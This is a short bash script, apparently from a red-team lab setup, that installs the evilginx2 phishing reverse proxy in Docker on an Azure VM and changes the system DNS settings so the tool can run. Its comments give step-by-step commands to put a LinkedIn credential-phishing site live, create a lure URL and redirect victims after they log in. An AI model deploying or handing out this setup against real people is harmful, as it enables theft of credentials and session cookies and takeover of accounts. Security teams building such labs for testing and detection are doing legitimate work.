#!/bin/bash

# Author: Roberto Rodriguez (@Cyb3rWard0g)
# References:
# https://breakdev.org/evilginx-2-1-the-first-post-release-update/

# *********** log tagging variables ***********
INFO_TAG="[INSTALLATION-INFO]"
ERROR_TAG="[INSTALLATION-ERROR]"

# *********** Set Log File ***************
LOGFILE="/var/log/evilginx2-install.log"
echoerror() {
    printf "${RC} * ERROR${EC}: $@\n" 1>&2;
}

# Install Docker and Docker-Compose
./Install-Docker.sh

# *********** Installing Service ***********
git clone https://github.com/kgretzky/evilginx2 /opt/evilginx2 >> $LOGFILE 2>&1
cd /opt/evilginx2 && docker build -t evilginx2 . >> $LOGFILE 2>&1

# *********** Updating resolved.conf ***********
sed -i "s|^#DNS=$|DNS=168.63.129.16|g" /etc/systemd/resolved.conf # Azure DNS
sed -i "s|^#DNSStubListener=yes$|DNSStubListener=no|g" /etc/systemd/resolved.conf

ln -sf /run/systemd/resolve/resolv.conf /etc/resolv.conf
systemctl restart systemd-resolved

# *********** Run evilginx2 container ***********
# SSH to VM
# sudo su
# Run EvilGinx2 in developer mode (generates self-signed certificates for all hostnames)
# docker run -it -p 53:53/udp -p 80:80 -p 443:443 --name evilginx2 -v /opt/evilginx2/phishlets:/app/phishlets evilginx2 -developer

# *********** Getting Started ***********
# Reference:
# https://github.com/kgretzky/evilginx2#getting-started
# https://breakdev.org/evilginx-2-1-the-first-post-release-update/

# Set up your server's domain and IP using following commands
# config domain yourdomain.com
# config ip 10.0.0.1

# Now you can set up the phishlet you want to use.
# phishlets hostname linkedin my.phishing.hostname.yourdomain.com
# phishlets get-hosts linkedin

# And now you can enable the phishlet
# phishlets enable linkedin

# Your phishing site is now live. Think of the URL, you want the victim to be redirected to on successful login
# lures create linkedin
# lures edit 0 redirect_url https://www.google.com
# lures get-url 0